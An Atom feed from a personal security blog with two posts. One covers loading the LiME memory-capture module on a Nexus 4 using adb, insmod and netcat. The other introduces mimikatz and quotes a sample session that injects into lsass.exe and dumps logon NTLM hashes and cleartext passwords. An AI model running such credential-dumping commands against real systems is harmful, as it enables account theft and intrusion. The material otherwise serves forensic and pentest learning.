<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en">
<title type="text">Wandering Around</title>
<generator uri="https://github.com/jekyll/jekyll">Jekyll</generator>
<link rel="self" type="application/atom+xml" href="http://jahil.github.io/feed.xml" />
<link rel="alternate" type="text/html" href="http://jahil.github.io" />
<updated>2014-11-25T15:37:14+04:00</updated>
<id>http://jahil.github.io/</id>
<author>
  <name>Mohsin Mirza</name>
  <uri>http://jahil.github.io/</uri>
  <email>named.conf@gmail.com</email>
</author>


<entry>
  <title type="html"><![CDATA[LiME Module for Nexus 4 - Kitkat 4.4.4]]></title>
  <link rel="alternate" type="text/html" href="http://jahil.github.io/lime-module-for-nexus-4-kitkat-4-4-4/" />
  <id>http://jahil.github.io/lime-module-for-nexus-4-kitkat-4-4-4</id>
  <published>2014-11-24T17:59:25+04:00</published>
  <updated>2014-11-24T17:59:25+04:00</updated>
  <author>
    <name>Mohsin Mirza</name>
    <uri>http://jahil.github.io</uri>
    <email>named.conf@gmail.com</email>
  </author>
  <content type="html">&lt;p&gt;&lt;a href=&quot;https://github.com/504ensicsLabs/LiME&quot;&gt;LiME ~ Linux Memory Extractor&lt;/a&gt; allows the acquisition of volatile memory from Linux and Linux-based devices.
Nexus 4 stock kernel doesnt support LKM, you can build module against stock kernel unless you rebuild kernel with LKM support.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Device: Mako aka Nexus 4&lt;/li&gt;
  &lt;li&gt;Kernel Version: &lt;a href=&quot;http://franciscofranco.minooch.com/Nexus4/4.4/zips/franco.Kernel-nightly-r213.zip&quot;&gt;franco #213&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;Android: 4.4.4 &lt;/li&gt;
  &lt;li&gt;Build: KTU84P &lt;/li&gt;
  &lt;li&gt;LiME Module: &lt;a href=&quot;https://github.com/jahil/jahil.github.io/raw/master/_site/lime-module-for-nexus-4-kitkat-4-4-4/lime-franco.ko.gz&quot;&gt;pre-compiled&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;volatilityfoundation.org&quot;&gt;Volatility&lt;/a&gt; Profile:&lt;a href=&quot;https://github.com/jahil/profiles/raw/master/Linux/Android/Nexus4/Nexus4-Franco-3.4.88.zip&quot;&gt;LinuxNexus4-Franco-3_4_88ARM&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;br /&gt;
&lt;em&gt;Tip: You can flash kernel with CWM or TWRP&lt;/em&gt;
&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;usage&quot;&gt;Usage&lt;/h2&gt;
&lt;p&gt;LiME utilizes the insmod command to load the module, passing required arguments for its execution.&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;insmod ./lime.ko &amp;quot;path=&amp;lt;outfile | tcp:&amp;lt;port&amp;gt;&amp;gt; format=&amp;lt;raw|padded|lime&amp;gt; [dio=&amp;lt;0|1&amp;gt;]&amp;quot;

path (required):   outfile ~ name of file to write to on local system (SD Card)
        tcp:port ~ network port to communicate over

format (required): raw ~ concatenates all System RAM ranges
        padded ~ pads all non-System RAM ranges with 0s
        lime ~ each range prepended with fixed-size header containing address space info

dio (optional):    1 ~ attempt to enable Direct IO
        0 ~ default, do not attempt Direct IO&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h2 id=&quot;examples&quot;&gt;Examples&lt;/h2&gt;

&lt;p&gt;Acquisition over the network&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;$ gzip -d lime-franco.ko.gz
$ adb push lime-franco.ko /sdcard/lime-mako.ko
$ adb forward tcp:4444 tcp:4444
$ adb shell
# insmod /sdcard/lime-mako.ko &amp;quot;path=tcp:4444 format=lime&amp;quot;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;from host machine use netcat to establish the connection and acquire memory dump&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;$ nc localhost 4444 &amp;gt; mako.lime&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Acquisition to sdcard&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;# insmod /sdcard/lime-mako.ko &amp;quot;path=/sdcard/ram.lime format=lime&amp;quot;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;


  &lt;p&gt;&lt;a href=&quot;http://jahil.github.io/lime-module-for-nexus-4-kitkat-4-4-4/&quot;&gt;LiME Module for Nexus 4 - Kitkat 4.4.4&lt;/a&gt; was originally published by Mohsin Mirza at &lt;a href=&quot;http://jahil.github.io&quot;&gt;Wandering Around&lt;/a&gt; on November 24, 2014.&lt;/p&gt;</content>
</entry>


<entry>
  <title type="html"><![CDATA[Mimikatz]]></title>
  <link rel="alternate" type="text/html" href="http://jahil.github.io/mimikatz/" />
  <id>http://jahil.github.io/mimikatz</id>
  <published>2014-11-23T17:30:31+04:00</published>
  <updated>2014-11-23T17:30:31+04:00</updated>
  <author>
    <name>Mohsin Mirza</name>
    <uri>http://jahil.github.io</uri>
    <email>named.conf@gmail.com</email>
  </author>
  <content type="html">&lt;p&gt;Here’s a brief post about very cool feature of a tool called mimikatz.
I’m very grateful to the tool’s author for bringing it to my attention. Until that point, I didn’t realise it was possible to recover the cleartext passwords of logged on windows users. Something that I’m sure most pentesters would find very useful.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Here’s some sample output provided by the author:&lt;/p&gt;
&lt;/blockquote&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;mimikatz 1.0 x86 (pre-alpha)    /* Traitement du Kiwi */

mimikatz # privilege::debug
Demande d&amp;#39;ACTIVATION du privilège : SeDebugPrivilege : OK

mimikatz # inject::process lsass.exe sekurlsa.dll
PROCESSENTRY32(lsass.exe).th32ProcessID = 488
Attente de connexion du client...
Serveur connecté à un client !
Message du processus :
Bienvenue dans un processus distant
                        Gentil Kiwi

SekurLSA : librairie de manipulation des données de sécurités dans LSASS

mimikatz # @getLogonPasswords

Authentification Id         : 0;434898
Package d&amp;#39;authentification  : NTLM
Utilisateur principal       : Gentil User
Domaine d&amp;#39;authentification  : vm-w7-ult
        msv1_0 :        lm{ e52cac67419a9a224a3b108f3fa6cb6d }, ntlm{ 8846f7eaee8fb117ad06bdd830b7586c }
        wdigest :       password
        tspkg :         password

Authentification Id         : 0;269806
Package d&amp;#39;authentification  : NTLM
Utilisateur principal       : Gentil Kiwi
Domaine d&amp;#39;authentification  : vm-w7-ult
        msv1_0 :        lm{ d0e9aee149655a6075e4540af1f22d3b }, ntlm{ cc36cf7a8514893efccd332446158b1a }
        wdigest :       waza1234/
        tspkg :         waza1234/&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;I wondered why the cleartext password would need to be stored in LSASS – after all every pentester will tell you that you don’t need the password to authenticate, just the hash.
A bit of googling seems to indicate that wdigest (the password) is required to support HTTP Digest Authentication and other schemes that require the authenticating party to know the password – and not just the hash.
—&lt;/p&gt;

  &lt;p&gt;&lt;a href=&quot;http://jahil.github.io/mimikatz/&quot;&gt;Mimikatz&lt;/a&gt; was originally published by Mohsin Mirza at &lt;a href=&quot;http://jahil.github.io&quot;&gt;Wandering Around&lt;/a&gt; on November 23, 2014.&lt;/p&gt;</content>
</entry>

</feed>
